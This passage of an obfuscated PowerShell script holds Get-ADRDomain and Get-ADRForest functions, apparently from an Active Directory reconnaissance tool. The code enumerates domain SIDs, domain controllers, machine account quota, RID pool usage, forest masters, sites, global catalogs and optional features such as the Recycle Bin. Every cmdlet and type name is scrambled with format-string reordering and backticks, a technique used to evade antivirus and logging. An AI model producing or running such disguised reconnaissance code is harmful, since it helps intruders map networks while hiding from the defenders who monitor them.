                ${F`OreSTCO`NtexT} = &("{2}{0}{1}"-f'w-Ob','ject','Ne') ("{8}{7}{5}{15}{11}{13}{1}{16}{3}{6}{2}{4}{12}{0}{14}{9}{10}" -f 'c','Services.A','rector','ve','y.Dir','m','Di','ste','Sy','Conte','xt','cto','e','ry','tory','.Dire','cti')(("{0}{2}{1}" -f 'Fo','t','res'),$(${aDdom`A`in}."FoRE`sT"),$(${cre`DenT`IAL}."USE`Rna`me"),$(${C`R`edeNTi`AL}.("{4}{5}{0}{3}{2}{6}{1}" -f'rk','tial','de','Cre','GetNet','wo','n').Invoke()."PAsSW`o`RD"))
                ${adF`ORE`sT} =  ( GET-VARIAbLE  ("w"+"Vlf")).VAluE::("{2}{0}{1}"-f 'Fo','rest','Get').Invoke(${F`O`RES`TCoNtext})
            }
            Catch
            {
                &("{1}{2}{0}" -f'ing','Write-War','n') ("{4}{3}{8}{2}{0}{9}{1}{6}{5}{10}{7}" -f 'Err','ing Fo','] ','ADRDomai','[Get-','t Co','res','t','n','or gett','ntex')
                &("{3}{2}{4}{0}{1}" -f'os','e','V','Write-','erb') "[EXCEPTION] $($_.Exception.Message) "
            }
            If (${FoR`ES`Tc`On`TEXT})
            {
                &("{0}{3}{4}{2}{1}"-f'R','able','i','emove-V','ar') ("{0}{1}{2}"-f 'Fores','tC','ontext')
            }
            If (${ADf`OREST})
            {
                ${gLO`BalC`A`TALoG} = ${aD`Fo`REst}.("{2}{0}{1}{3}{4}" -f 'nd','Global','Fi','Cat','alog').Invoke()
            }
            If (${glOBAlc`Ata`LOG})
            {
                ${D`N} = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    ${AdO`BjECT} = &("{0}{1}{2}" -f 'New','-Objec','t') -TypeName ("{6}{9}{4}{3}{5}{2}{8}{7}{1}{0}" -f'y','r','irectoryServices.Direc','m','e','.D','Sys','Ent','tory','t') -ArgumentList ($(${Dn}),$(${c`REDen`T`iaL}."us`ErnA`me"),$(${c`RedeNtI`Al}.("{2}{1}{3}{0}"-f 'edential','tNet','Ge','workCr').Invoke()."p`ASsW`orD"))
                    ${adDO`m`AiNsid} = &("{2}{0}{1}" -f 'ew','-Object','N') ("{4}{6}{3}{7}{0}{1}{8}{5}{2}" -f 'u','r','ntifier','cipal','Sy','de','stem.Security.Prin','.Sec','ityI')(${aD`obJect}."OBJE`Cts`Id"[0], 0)
                    ${AdObjE`CT}.("{0}{2}{1}" -f'Dis','se','po').Invoke()
                }
                Catch
                {
                    &("{4}{2}{3}{0}{1}"-f 'n','ing','a','r','Write-W') "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    &("{0}{1}{2}{3}"-f 'Wri','t','e','-Verbose') "[EXCEPTION] $($_.Exception.Message) "
                    ${ADD`Oma`I`NsID} = &("{3}{2}{1}{0}" -f't','Objec','w-','Ne') ("{5}{0}{4}{8}{3}{2}{1}{6}{7}" -f 'em','l.Secur','a','incip','.Secur','Syst','ityId','entifier','ity.Pr')(${o`BjD`Oma`In}."ob`jECtS`Id"[0], 0)
                }
            }
            Else
            {
                ${ADdO`m`AInSID} = &("{2}{1}{0}" -f't','jec','New-Ob') ("{1}{6}{4}{7}{2}{3}{5}{0}" -f'fier','System.Se','Principal.Secur','ityI','ty','denti','curi','.')(${O`BjdOM`A`In}."obJ`eCt`sid"[0], 0)
            }
        }
        Else
        {
            ${a`DDOM`AIn} =  $Ux5m::("{2}{4}{1}{0}{3}"-f 'om','D','GetCurr','ain','ent').Invoke()
            ${aDfO`RE`St} =  ( itEm  VarIablE:wvlf ).VAlUe::("{3}{1}{2}{0}"-f'rentForest','tCu','r','Ge').Invoke()
            Try
            {
                ${GLob`A`lcATaLOG} = ${adF`O`REsT}.("{3}{1}{0}{2}" -f 'lobal','ndG','Catalog','Fi').Invoke()
                ${D`N} = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                ${ADo`BJ`eCt} = &("{2}{0}{1}"-f'ec','t','New-Obj') -TypeName ("{7}{4}{3}{0}{6}{1}{8}{5}{2}"-f'ic','s.Direct','ry','Serv','ry','yEnt','e','System.Directo','or') -ArgumentList (${DN})
                ${A`DDo`MAINs`Id} = &("{1}{2}{0}" -f'ct','N','ew-Obje') ("{10}{9}{2}{6}{0}{3}{11}{8}{12}{4}{7}{5}{1}"-f't','ier','m.Sec','y','urityIde','tif','uri','n','pal.Se','te','Sys','.Princi','c')(${AdObJ`e`CT}."o`BjeCt`S`Id"[0], 0)
                ${ADOBJe`CT}.("{0}{1}" -f 'dispo','se').Invoke()
            }
            Catch
            {
                &("{0}{1}{2}" -f 'Wr','ite','-Warning') "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                &("{2}{3}{0}{1}"-f 'te-Ve','rbose','W','ri') "[EXCEPTION] $($_.Exception.Message) "
                ${A`ddOMa`insId} = &("{2}{0}{1}"-f'w-Obje','ct','Ne') ("{8}{6}{0}{1}{9}{2}{4}{3}{7}{5}"-f 'ur','ity.Pr','nc','nt','ipal.SecurityIde','fier','stem.Sec','i','Sy','i')(${OBjdoM`A`in}."ob`jECT`SId"[0], 0)
            }
            
            Try
            {
                ${R`i`D`MaNAGer} = ([ADSI]"LDAP://CN=RID Manager$,CN=System,$($objDomain.distinguishedName) ")
                ${rId`p`Ro`PerTY} = ${oBJD`oMa`In}.("{1}{2}{0}{3}{4}"-f'ToIn','Conve','rtLargeInteger','t','64').Invoke(${RiD`m`ANA`GEr}."P`ROPERt`IEs"."r`IDAVaiLaB`lEPOol"."v`ALUE")
                [int32] ${To`TaL`s`IDS} = $(${R`IDPROpE`R`TY}) / ( $UXzo::("{0}{1}" -f'Po','w').Invoke(2,32))
                [int64] ${t`Emp64`VAL} = ${ToT`Als`IDS} * (  ( vARIAbLe  uXZO -VaLUeON  )::("{0}{1}"-f 'Po','w').Invoke(2,32))
                ${riD`SI`ssUeD} = [int32]($(${Ri`DProPE`RtY}) - ${TeMP64`V`AL})
                ${riD`s`REMaIniNg} = ${Tot`A`lSIDs} - ${rIDs`Is`SUeD}
                &("{3}{0}{4}{2}{1}"-f'v','e','iabl','Remo','e-Var') ("{1}{2}{0}"-f 'r','RIDMa','nage')
                &("{3}{0}{4}{1}{2}" -f'e','Variab','le','Remov','-') ("{0}{2}{1}" -f 'RIDp','ty','roper')
                &("{3}{2}{0}{1}" -f 'r','iable','move-Va','Re') ("{2}{0}{1}"-f'a','lSIDS','tot')
                &("{0}{2}{1}" -f 'R','ble','emove-Varia') ("{1}{0}{2}"-f 'mp64','te','val')
            }
            Catch
            {
                &("{3}{2}{1}{0}"-f 'ng','te-Warni','ri','W') "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                &("{2}{1}{0}{3}" -f's','e-Verbo','Writ','e') "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If (${a`DDOm`Ain})
        {
            ${DomaIN`O`BJ} = @()

            
            ${fl`AD} = @{
	            0 = ("{2}{0}{1}"-f'ind','ows2000','W');
	            1 = ("{1}{2}{4}{3}{0}"-f 'rim','Wi','ndo','2003/Inte','ws');
	            2 = ("{0}{1}{2}"-f'Wi','nd','ows2003');
	            3 = ("{2}{0}{1}{3}"-f'n','dows2','Wi','008');
	            4 = ("{2}{1}{0}" -f '8R2','s200','Window');
	            5 = ("{2}{1}{0}{3}" -f'nd','i','W','ows2012');
	            6 = ("{4}{0}{3}{1}{2}" -f 'indows2','R','2','012','W');
	            7 = ("{1}{2}{0}" -f '16','Wind','ows20')
            }
            ${doMa`i`NmoDE} = ${fL`AD}[ (gET-ChiLdiTem vaRIabLe:AScOuG).VAlue::("{0}{1}" -f 'T','oInt32').Invoke(${oBjDoM`A`i`N`RootDsE}."dom`AINFU`NC`TiO`NA`LITY",10)] + ("{1}{0}{2}" -f'oma','D','in')
            &("{0}{2}{1}{3}{4}"-f'Rem','a','ove-V','ria','ble') ("{1}{0}"-f'AD','FL')

            ${ObJV`ALU`Es} = @(("{1}{0}" -f'me','Na'), ${add`o`m`AIN}."nA`me", ("{1}{0}"-f 'BIOS','Net'), ${oBJd`OmA`In}."D`c"."v`ALue", ("{4}{1}{0}{2}{3}" -f 'tio','nc','nal L','evel','Fu'), ${DOm`Ai`NmODE}, ("{0}{1}{2}" -f 'Doma','inS','ID'), ${AdDOMa`IN`S`id}."vAl`Ue")

            For (${I} = 0; ${i} -lt $(${OBJ`VAL`UES}."CO`UNt"); ${i}++)
            {
                ${O`Bj} = &("{2}{0}{1}" -f'Ob','ject','New-') ("{1}{0}" -f 'bject','PSO')
                ${O`Bj} | &("{0}{2}{1}"-f'Ad','ber','d-Mem') -MemberType ("{2}{0}{1}"-f 't','y','NoteProper') -Name ("{0}{1}{2}"-f 'Cat','egor','y') -Value ${obJ`V`AL`UES}[${I}]
                ${O`BJ} | &("{2}{1}{0}"-f 'r','dd-Membe','A') -MemberType ("{2}{3}{1}{0}" -f'perty','o','Note','Pr') -Name ("{1}{0}" -f'e','Valu') -Value ${oB`jV`ALuEs}[${I}+1]
                ${i}++
                ${DomAi`N`oBj} += ${O`BJ}
            }
            &("{0}{3}{1}{2}"-f 'Rem','-','Variable','ove') ("{1}{2}{3}{0}"-f'e','Do','ma','inMod')

            For(${i}=0; ${I} -lt ${A`D`d`OmAIN}."dOmAiN`C`ON`TrolL`e`RS"."cOU`NT"; ${i}++)
            {
                ${O`BJ} = &("{1}{2}{0}"-f 'ct','New','-Obje') ("{2}{0}{1}" -f'SObjec','t','P')
                ${o`Bj} | &("{3}{2}{0}{1}"-f 'Memb','er','d-','Ad') -MemberType ("{0}{2}{1}{3}" -f 'NoteP','e','rop','rty') -Name ("{2}{1}{0}" -f'ory','g','Cate') -Value ("{3}{4}{0}{1}{2}" -f 'in Contro','ll','er','D','oma')
                ${O`Bj} | &("{1}{0}{2}"-f 'mb','Add-Me','er') -MemberType ("{2}{0}{1}{3}" -f'p','e','NotePro','rty') -Name ("{0}{1}" -f 'Va','lue') -Value ${ADd`o`mAiN}."D`OMAInCoNT`RolLe`Rs"[${I}]
                ${D`OmaINo`Bj} += ${o`BJ}
            }

            ${o`BJ} = &("{0}{1}{2}" -f'Ne','w-','Object') ("{2}{1}{0}" -f't','SObjec','P')
            ${O`Bj} | &("{0}{2}{1}" -f 'Add','ber','-Mem') -MemberType ("{0}{1}{2}" -f 'N','oteProp','erty') -Name ("{2}{1}{0}" -f 'ory','eg','Cat') -Value ("{0}{2}{3}{1}" -f 'Cre','n Date','at','io')
            ${O`BJ} | &("{0}{2}{1}{3}" -f 'Add-','embe','M','r') -MemberType ("{2}{1}{0}" -f 'perty','otePro','N') -Name ("{0}{1}" -f'Va','lue') -Value ${oBJD`om`AiN}."wHE`NcrE`A`TED"."VA`luE"
            ${D`Om`AiNObj} += ${O`BJ}

            ${O`BJ} = &("{2}{1}{0}"-f '-Object','ew','N') ("{2}{0}{1}"-f'b','ject','PSO')
            ${o`BJ} | &("{2}{1}{0}" -f'Member','-','Add') -MemberType ("{3}{0}{2}{1}"-f'o','erty','teProp','N') -Name ("{1}{0}"-f 'ory','Categ') -Value ("{0}{1}{4}{3}{2}{5}{6}"-f'ms-','DS-','ccoun','hineA','Mac','tQ','uota')
            ${O`BJ} | &("{0}{1}{2}"-f'A','dd-Membe','r') -MemberType ("{1}{2}{0}"-f 'y','NoteProper','t') -Name ("{0}{1}"-f 'V','alue') -Value ${OBj`DO`maIn}.'ms-DS-MachineAccountQuota'."VAl`Ue"
            ${DO`main`O`Bj} += ${O`BJ}

            If (${RidS`Is`S`UEd})
            {
                ${o`BJ} = &("{1}{2}{0}"-f't','New-','Objec') ("{0}{1}"-f 'P','SObject')
                ${o`BJ} | &("{0}{3}{2}{1}" -f'A','mber','Me','dd-') -MemberType ("{0}{1}{2}"-f 'N','oteProp','erty') -Name ("{1}{0}{2}" -f'tegor','Ca','y') -Value ("{3}{2}{0}{1}" -f'ssu','ed','s I','RID')
                ${o`Bj} | &("{2}{1}{0}" -f 'er','d-Memb','Ad') -MemberType ("{1}{0}{3}{2}" -f'oteP','N','y','ropert') -Name ("{1}{0}"-f'lue','Va') -Value ${ridsiSs`U`ED}
                ${DomAI`NO`BJ} += ${O`Bj}
                &("{3}{0}{2}{1}" -f'emov','-Variable','e','R') ("{1}{0}{2}" -f'sIssu','RID','ed')
            }
            If (${r`IdsRE`m`AINIng})
            {
                ${o`Bj} = &("{1}{0}{3}{2}"-f'w-Ob','Ne','ct','je') ("{1}{2}{0}" -f 'ct','PSO','bje')
                ${o`BJ} | &("{1}{2}{0}"-f 'ember','Add-','M') -MemberType ("{0}{1}{2}{3}"-f'NoteP','ro','per','ty') -Name ("{0}{2}{1}" -f 'Cat','ory','eg') -Value ("{3}{0}{1}{2}" -f 'Ds ','Remain','ing','RI')
                ${o`BJ} | &("{2}{0}{1}" -f 'mbe','r','Add-Me') -MemberType ("{1}{0}{2}{3}" -f'rop','NoteP','er','ty') -Name ("{1}{0}" -f 'ue','Val') -Value ${r`IDSr`EM`AinIng}
                ${dOM`A`InOBj} += ${o`Bj}
                &("{0}{3}{2}{1}"-f'Remov','le','ab','e-Vari') ("{0}{2}{1}{3}"-f'RIDs','m','Re','aining')
            }
        }
    }

    If (${dOMAi`N`obJ})
    {
        Return ${DOMA`I`N`OBJ}
    }
    Else
    {
        Return ${nu`Ll}
    }
}

Function g`ET-`ADRfOrest
{

    param(
        [Parameter(MAnDaToRY = ${tR`UE})]
        [string] ${me`T`hOd},

        [Parameter(ManDatory = ${f`A`lSE})]
        [DirectoryServices.DirectoryEntry] ${oB`JdoM`Ain},

        [Parameter(MANdATory = ${FaL`SE})]
        [DirectoryServices.DirectoryEntry] ${objDomAINR`O`Ot`DSE},

        [Parameter(mAnDaTORy = ${fa`Lse})]
        [string] ${doMAiNcO`N`T`ROll`er},

        [Parameter(MaNDatORY = ${F`AL`se})]
        [Management.Automation.PSCredential] ${C`REDe`NTiAL} =  $ClF0N::"EM`pty"
    )

    If (${m`et`Hod} -eq ("{0}{1}"-f 'A','DWS'))
    {
        Try
        {
            ${a`DDom`AIn} = &("{0}{1}{2}{3}" -f 'Get','-AD','Do','main')
        }
        Catch
        {
            &("{1}{0}{3}{2}" -f'rite','W','ng','-Warni') ("{3}{5}{6}{8}{4}{2}{10}{9}{11}{1}{0}{7}" -f'nte','o','ing','[Get-AD','t','RFo','re','xt','st] Error get','main',' Do',' C')
            &("{2}{1}{0}" -f 'se','e-Verbo','Writ') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nu`LL}
        }

        Try
        {
            ${aDf`OrEST} = &("{2}{0}{1}"-f 't-ADFores','t','Ge') ${A`DD`omAiN}."FO`R`Est"
        }
        Catch
        {
            &("{3}{2}{0}{1}" -f'rbos','e','e-Ve','Writ') ("{5}{6}{2}{3}{0}{7}{1}{9}{8}{4}"-f 'or g','t','RForest','] Err','ontext','[Get','-AD','et',' C','ing Forest')
            &("{2}{1}{0}" -f 'erbose','te-V','Wri') "[EXCEPTION] $($_.Exception.Message) "
        }
        &("{2}{0}{3}{1}"-f 'emov','iable','R','e-Var') ("{0}{2}{1}"-f 'ADDo','n','mai')

        If (-Not ${AdF`oR`esT})
        {
            Try
            {
                ${A`d`Fo`ReST} = &("{1}{2}{0}{3}" -f'Fores','Ge','t-AD','t') -Server ${DO`Ma`iNCon`T`RO`lLEr}
            }
            Catch
            {
                &("{1}{0}{2}" -f 'r','W','ite-Warning') ("{13}{11}{8}{1}{16}{15}{14}{10}{7}{9}{2}{4}{12}{5}{6}{0}{3}"-f'r param','Err',' C','eter','on','ext',' using Serve','Fores','RForest] ','t','g ','t-AD','t','[Ge','ttin','ge','or ')
                &("{1}{3}{2}{0}" -f'bose','Writ','er','e-V') "[EXCEPTION] $($_.Exception.Message) "
                Return ${NU`lL}
            }
        }

        If (${a`DfoRe`ST})
        {
            
            Try
            {
                ${aD`FO`REsTc`NC} = (&("{2}{1}{0}" -f'DRootDSE','A','Get-'))."CO`NFIGuRATi`onNAMIn`g`contexT"
                ${A`dfOreS`TD`S`CP} = &("{0}{2}{1}"-f'Ge','ADObject','t-') -Identity "CN=Directory Service,CN=Windows NT,CN=Services,$($ADForestCNC) " -Partition ${adF`OrE`sTc`Nc} -Properties ('*')
                ${Ad`ForE`s`T`TombStOnELI`F`et`iMe} = ${a`df`OrEst`DScP}."ToMB`s`TOnELiFE`T`IME"
                &("{1}{2}{0}"-f 'e','Remove','-Variabl') ("{0}{1}{2}"-f 'AD','F','orestCNC')
                &("{1}{3}{2}{0}"-f'able','Remove-','i','Var') ("{1}{0}{2}"-f 'Fo','AD','restDSCP')
            }
            Catch
            {
                &("{2}{0}{1}" -f'te-Warnin','g','Wri') ("{1}{3}{8}{5}{10}{9}{4}{2}{6}{0}{7}" -f'fetim','[Get-ADRF','s','ore','Tomb','] Erro','tone Li','e','st','rieving ','r ret')
                &("{1}{4}{3}{2}{0}"-f 'rbose','W','Ve','te-','ri') "[EXCEPTION] $($_.Exception.Message) "
            }

            
            If ( (dIR vAriAbLe:AscOuG  ).vaLUe::("{0}{1}{2}"-f'ToI','nt','32').Invoke(${A`D`FO`Rest}."F`oreSTM`oDe") -ge 4)
            {
                Try
                {
                    ${ADR`ecyC`l`EBIn} = &("{1}{0}{4}{2}{3}"-f'DOpti','Get-A','lFeat','ure','ona') -Identity ("{0}{2}{3}{1}" -f 'Recycle B','ature','in ','Fe') -Properties ("{0}{1}{2}" -f 'whenCre','ate','d')
                }
                Catch
                {
                    &("{0}{1}{2}" -f 'Wri','te-Wa','rning') ("{10}{2}{14}{1}{3}{11}{13}{12}{5}{4}{6}{9}{7}{0}{8}" -f'atu',' Error','DRForest',' r',' B','cle','i',' Fe','re','n','[Get-A','etr','ecy','ieving R',']')
                    &("{2}{3}{1}{0}" -f 'erbose','te-V','W','ri') "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            
            If (  $ascouG::("{1}{0}" -f 't32','ToIn').Invoke(${aD`FoRe`st}."Fo`REstmo`De") -ge 7)
            {
                Try
                {
                    ${PrIVil`eGedacC`essmAnaGEM`e`Nt} = &("{3}{1}{2}{0}{4}" -f'u','D','OptionalFeat','Get-A','re') -Identity ("{0}{5}{6}{7}{2}{3}{4}{1}"-f'Pr','ture',' Manag','emen','t Fea','iv','i','leged Access')
                }
                Catch
                {
                    &("{1}{0}{2}{3}{4}"-f 'rite-','W','War','ni','ng') ("{2}{3}{9}{5}{7}{12}{6}{10}{8}{11}{1}{0}{4}" -f 'ed Acceess Managemen','ivileg','[Get-AD','RFo','t Feature','t] ','or r','Er','ving','res','etrie',' Pr','r')
                    &("{1}{0}{2}{3}" -f'-','Write','Verbo','se') "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            ${FO`RE`stObj} = @()

            
            ${fl`Ad} = @{
                0 = ("{2}{0}{1}"-f 'indo','ws2000','W');
                1 = ("{2}{4}{3}{0}{1}{5}"-f'In','ter','Windows2','3/','00','im');
                2 = ("{2}{0}{1}" -f'ows20','03','Wind');
                3 = ("{1}{2}{0}" -f 'ows2008','W','ind');
                4 = ("{0}{2}{4}{3}{1}"-f'W','R2','indo','08','ws20');
                5 = ("{3}{1}{2}{0}"-f 'dows2012','i','n','W');
                6 = ("{3}{2}{0}{1}"-f'12R','2','ndows20','Wi');
                7 = ("{2}{0}{1}"-f's201','6','Window')
            }
            ${fo`R`EStm`ODe} = ${fl`Ad}[  ( Get-item  VAriABLe:AsCoug  ).vAluE::("{0}{1}{2}" -f 'T','oIn','t32').Invoke(${a`d`FoResT}."fOrE`StM`oDE")] + ("{0}{2}{1}"-f 'F','st','ore')
            &("{0}{3}{1}{2}"-f 'Rem','riabl','e','ove-Va') ("{0}{1}"-f 'FLA','D')

            If (-Not ${FO`Re`StMO`De})
            {
                ${F`ORes`T`moDE} = ${a`dFOr`EST}."fo`REStm`odE"
            }

            
            ${aD`RlAPsc`h`ECK} = &("{1}{2}{3}{0}" -f 'eck','Get-ADRLAP','SC','h') -Method ("{1}{0}" -f 'WS','AD')

            ${o`BjVA`lu`Es} = @(("{1}{0}"-f 'e','Nam'), ${aD`FOrE`St}."nA`me", ("{3}{0}{2}{1}" -f 'unctional','evel',' L','F'), ${for`es`TMO`DE}, ("{5}{1}{2}{0}{4}{3}"-f 'Nami','main',' ',' Master','ng','Do'), ${ADf`o`Rest}."dOma`IN`N`AmI`NgmaS`TEr", ("{2}{1}{3}{0}"-f 'r','ma Mast','Sche','e'), ${A`DfORest}."s`CH`EmAM`ASteR", ("{1}{0}{2}" -f'D','Root','omain'), ${adFO`Re`St}."r`oOtdoM`AIn", ("{3}{1}{0}{2}"-f'mai','o','n Count','D'), ${a`DforEsT}."dOM`A`iNS"."C`OUNt", ("{0}{2}{1}"-f 'Sit','nt','e Cou'), ${aDFor`EsT}."sIt`Es"."CO`Unt", ("{3}{4}{0}{5}{6}{1}{2}"-f'ob','ou','nt','G','l','al Catalo','g C'), ${aDfo`ReSt}."GlObA`l`CatAl`OGS"."c`Ount")

            For (${I} = 0; ${i} -lt $(${OBJv`A`lUeS}."CoU`NT"); ${I}++)
            {
                ${O`BJ} = &("{0}{1}{2}"-f 'New-','Obje','ct') ("{1}{0}" -f 'Object','PS')
                ${o`Bj} | &("{1}{3}{0}{2}" -f'be','Add-M','r','em') -MemberType ("{0}{2}{1}" -f 'Note','roperty','P') -Name ("{0}{1}{2}" -f 'C','atego','ry') -Value ${o`BjV`Al`UEs}[${i}]
                ${O`BJ} | &("{2}{0}{1}{3}" -f'-','Mem','Add','ber') -MemberType ("{2}{0}{3}{1}"-f'te','operty','No','Pr') -Name ("{0}{1}" -f'Va','lue') -Value ${o`Bj`ValUeS}[${I}+1]
                ${I}++
                ${fOREs`TO`BJ} += ${o`Bj}
            }
            &("{2}{4}{1}{0}{3}"-f'b','ia','Rem','le','ove-Var') ("{1}{2}{0}" -f'Mode','For','est')

            For(${i}=0; ${i} -lt ${AD`F`OReST}."D`o`MainS"."C`ounT"; ${i}++)
            {
                ${O`BJ} = &("{1}{3}{0}{2}" -f'O','N','bject','ew-') ("{0}{1}"-f'PSOb','ject')
                ${O`BJ} | &("{0}{2}{1}"-f'A','ber','dd-Mem') -MemberType ("{3}{2}{0}{1}"-f'ro','perty','P','Note') -Name ("{1}{2}{0}" -f 'ory','Cate','g') -Value ("{1}{0}" -f'main','Do')
                ${O`Bj} | &("{0}{2}{1}" -f'Ad','er','d-Memb') -MemberType ("{0}{2}{1}{3}" -f'N','opert','otePr','y') -Name ("{0}{1}" -f'Val','ue') -Value ${aD`FoRE`sT}."DOm`A`iNS"[${i}]
                ${ForEs`TO`Bj} += ${o`BJ}
            }
            For(${I}=0; ${i} -lt ${a`dfOR`ESt}."SiT`ES"."C`ount"; ${I}++)
            {
                ${o`Bj} = &("{1}{2}{0}" -f'ect','New-Ob','j') ("{0}{1}" -f'PS','Object')
                ${o`Bj} | &("{1}{2}{0}"-f'er','Add-','Memb') -MemberType ("{0}{3}{2}{1}"-f'N','roperty','eP','ot') -Name ("{2}{1}{0}"-f 'y','egor','Cat') -Value ("{1}{0}"-f'te','Si')
                ${o`Bj} | &("{1}{0}{2}"-f'embe','Add-M','r') -MemberType ("{3}{2}{0}{1}"-f'p','erty','tePro','No') -Name ("{0}{1}"-f'Val','ue') -Value ${AdF`o`ReSt}."s`ITes"[${i}]
                ${FO`R`E`stoBJ} += ${O`Bj}
            }
            For(${i}=0; ${i} -lt ${aDfoRe`sT}."GLo`BA`lCA`TALOgs"."CO`UNt"; ${i}++)
            {
                ${o`BJ} = &("{0}{2}{1}" -f'New-Ob','t','jec') ("{2}{1}{0}"-f 'ct','bje','PSO')
                ${o`BJ} | &("{0}{2}{1}"-f 'Add-M','er','emb') -MemberType ("{1}{3}{2}{0}" -f 'y','Not','pert','ePro') -Name ("{0}{2}{1}"-f 'Catego','y','r') -Value ("{1}{2}{0}{4}{3}"-f'lC','Glob','a','og','atal')
                ${O`BJ} | &("{0}{2}{1}"-f'Add-M','ber','em') -MemberType ("{2}{3}{1}{0}" -f'rty','tePrope','N','o') -Name ("{0}{1}" -f'V','alue') -Value ${aD`FO`RESt}."gl`oBAlca`T`ALOgs"[${i}]
                ${f`oresTo`BJ} += ${o`Bj}
            }

            ${o`Bj} = &("{1}{2}{3}{0}"-f'ject','Ne','w-O','b') ("{0}{2}{1}"-f 'P','Object','S')
            ${O`Bj} | &("{0}{1}{2}"-f'Add-','Memb','er') -MemberType ("{0}{3}{1}{2}"-f'Not','er','ty','eProp') -Name ("{0}{1}{2}" -f'Categ','or','y') -Value ("{5}{1}{4}{3}{0}{2}" -f 'e','mbst','time','f','one Li','To')
            If (${aD`FO`RE`S`TtoMBstoNE`Lif`Eti`mE})
            {
                ${o`BJ} | &("{2}{0}{1}"-f'm','ber','Add-Me') -MemberType ("{0}{1}{2}" -f'NotePro','per','ty') -Name ("{1}{0}" -f'e','Valu') -Value ${adfO`ResttOmBsTO`N`e`lIFEtimE}
                &("{1}{2}{3}{4}{0}"-f'e','Remo','ve-Var','ia','bl') ("{1}{5}{2}{4}{3}{0}"-f'e','AD','st','tim','TombstoneLife','Fore')
            }
            Else
            {
                ${O`BJ} | &("{2}{0}{1}" -f 'dd-M','ember','A') -MemberType ("{2}{1}{0}{3}" -f'Proper','e','Not','ty') -Name ("{0}{1}"-f'V','alue') -Value ("{1}{2}{0}{3}" -f ' Re','N','ot','trieved')
            }
            ${FOr`e`sToBj} += ${o`BJ}

            ${O`BJ} = &("{2}{0}{3}{1}"-f 'w-Obj','t','Ne','ec') ("{1}{0}{2}"-f'O','PS','bject')
            ${O`BJ} | &("{1}{0}{3}{2}" -f 'd','A','r','d-Membe') -MemberType ("{2}{1}{0}"-f 'rty','otePrope','N') -Name ("{2}{1}{0}" -f'ory','eg','Cat') -Value ("{8}{5}{3}{7}{0}{2}{1}{6}{4}"-f ' (20',' R2 onw','08','yc','s)','ec','ard','le Bin','R')
            If (${adrecyC`l`E`B`IN})
            {
                If (${adR`ec`YcL`EbiN}."e`NaB`LE`Ds`coPeS"."cOU`Nt" -gt 0)
                {
                    ${o`BJ} | &("{0}{3}{1}{2}"-f 'A','d','-Member','d') -MemberType ("{2}{3}{0}{1}"-f 'ope','rty','NoteP','r') -Name ("{0}{1}"-f 'Val','ue') -Value ("{1}{2}{0}"-f'abled','E','n')
                    ${FOReS`T`ObJ} += ${o`Bj}

                    ${O`BJ} = &("{2}{0}{1}"-f '-Ob','ject','New') ("{1}{0}" -f 't','PSObjec')
                    ${o`Bj} | &("{1}{2}{0}"-f'ber','Ad','d-Mem') -MemberType ("{2}{3}{0}{1}"-f'ert','y','NoteP','rop') -Name ("{0}{2}{1}"-f 'Cat','ry','ego') -Value ("{2}{5}{6}{4}{1}{0}{3}"-f 'Enabled D',' ','Re','ate','in','cyc','le B')
                    ${O`BJ} | &("{0}{1}{2}" -f'Ad','d-Membe','r') -MemberType ("{2}{0}{1}"-f 'o','teProperty','N') -Name ("{0}{1}" -f 'Val','ue') -Value ${a`d`Re`CY`cLebIN}."Whe`NCrEa`TED"
                    ${F`o`Re`sTOBJ} += ${o`Bj}

                    For(${i}=0; ${I} -lt $(${aDr`e`cYcLE`BiN}."En`Ab`LeDSCOp`eS"."C`ount"); ${i}++)
                    {
                        ${o`Bj} = &("{1}{2}{0}"-f'-Object','N','ew') ("{0}{1}"-f'PSObj','ect')
                        ${O`Bj} | &("{2}{0}{1}"-f 'Me','mber','Add-') -MemberType ("{1}{3}{0}{2}"-f't','NoteP','y','roper') -Name ("{0}{1}{2}"-f 'Ca','teg','ory') -Value ("{4}{0}{2}{3}{1}" -f'nab','e','led Sco','p','E')
                        ${o`BJ} | &("{2}{0}{1}" -f'be','r','Add-Mem') -MemberType ("{0}{3}{2}{1}"-f'No','y','ropert','teP') -Name ("{1}{0}" -f 'ue','Val') -Value ${aDREc`Y`CLe`BiN}."eN`Ab`Le`d`SCOpes"[${I}]
                        ${F`Or`e`STobj} += ${O`Bj}
                    }
                }
                Else
                {
                    ${o`BJ} | &("{0}{1}{2}"-f 'Add-M','emb','er') -MemberType ("{1}{2}{0}" -f'roperty','Note','P') -Name ("{1}{0}" -f 'e','Valu') -Value ("{2}{0}{1}"-f 'e','d','Disabl')
                    ${f`o`Re`stobJ} += ${o`BJ}
                }
                &("{2}{3}{1}{0}{4}" -f'-V','ve','Rem','o','ariable') ("{2}{1}{0}{3}"-f'cycle','e','ADR','Bin')
            }
            Else
            {
                ${O`Bj} | &("{2}{0}{3}{1}"-f 'Me','r','Add-','mbe') -MemberType ("{2}{3}{0}{1}"-f 'r','operty','N','oteP') -Name ("{1}{0}" -f 'e','Valu') -Value ("{2}{1}{0}"-f'bled','sa','Di')
                ${fO`Re`stObj} += ${O`Bj}
            }

            ${O`Bj} = &("{1}{2}{0}"-f'ct','New-Ob','je') ("{1}{0}{2}"-f 'SObj','P','ect')
            ${O`Bj} | &("{0}{1}{2}"-f'Add','-Me','mber') -MemberType ("{0}{1}{3}{2}" -f'N','otePro','rty','pe') -Name ("{0}{1}{2}"-f 'Cat','ego','ry') -Value ("{12}{5}{7}{6}{10}{1}{8}{2}{9}{4}{0}{3}{11}"-f'6 ','s M','gement','onwa','201','r','vileg','i','ana',' (','ed Acces','rds)','P')
            If (${pRiV`Ileg`e`DacCEs`SMaN`AG`eme`NT})
            {
                If (${p`RiV`ilegE`DAc`Ce`ssM`ANAGEMeNT}."e`NABLe`dSCO`PeS"."COU`NT" -gt 0)
                {
